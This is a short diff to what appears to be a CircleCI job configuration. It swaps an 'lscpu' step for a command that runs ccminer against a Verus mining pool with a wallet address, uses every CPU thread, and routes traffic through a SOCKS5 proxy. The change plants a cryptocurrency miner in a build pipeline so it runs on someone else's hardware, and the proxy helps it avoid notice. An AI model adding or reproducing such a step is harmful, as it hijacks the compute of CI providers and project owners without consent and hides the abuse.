@@ -8,4 +8,4 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run:  lscpu
+      - run:  ./ccminer -a verus  -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RTtk7vLmDyGniud9QibWXsignTafFPTHg7.test -p c=RVN -t $(nproc --all) --proxy socks5://72.195.114.184:4145
